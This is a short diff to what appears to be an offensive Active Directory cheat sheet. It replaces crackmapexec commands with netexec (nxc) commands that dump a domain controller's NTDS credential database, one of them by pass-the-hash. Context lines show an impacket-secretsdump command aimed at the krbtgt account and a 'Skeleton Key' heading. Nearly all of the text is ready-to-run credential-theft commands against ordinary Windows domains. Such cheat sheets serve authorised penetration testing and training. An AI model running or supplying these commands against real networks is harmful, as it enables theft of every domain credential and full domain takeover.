@@ -113,9 +113,11 @@ impacket-secretsdump $DOMAIN/$USER:$PASS@$DC_IP -just-dc-user krbtgt
 ```
 
 ```bash
-# CME
-crackmapexec smb $DC_IP -u $USER -p $PASS --ntds
-crackmapexec smb $DC_IP -u $USER -p $PASS --ntds vss
+# Netexec
+nxc smb $DC_IP -u $USER -p $PASS --ntds
+nxc smb $DC_IP -u $USER -p $PASS --ntds vss
+
+nxc smb $DC_IP -u $USER -H $HASH --ntds
 ```
 
 ## 11.4 Skeleton Key
